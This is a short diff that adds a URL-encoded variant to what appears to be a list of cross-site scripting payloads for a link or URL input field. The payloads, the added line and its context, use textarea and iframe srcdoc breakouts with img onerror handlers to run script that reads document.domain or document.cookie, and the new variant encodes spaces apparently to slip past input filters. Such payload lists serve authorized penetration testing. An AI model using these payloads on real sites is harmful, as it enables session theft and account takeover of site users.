@@ -21,6 +21,7 @@ Insert Link/url field:
 XSS<iframe></textarea></iframe><iframe srcdoc="<img src onerror=alert(document.domain)>">
 
 XSS<iframe></textarea></iframe><iframe srcdoc="<img src onerror=alert(document.cookie)>">
+XSS<iframe></textarea></iframe><iframe%20srcdoc="<img%20src%20onerror=alert(document.cookie)>">
 
 
 
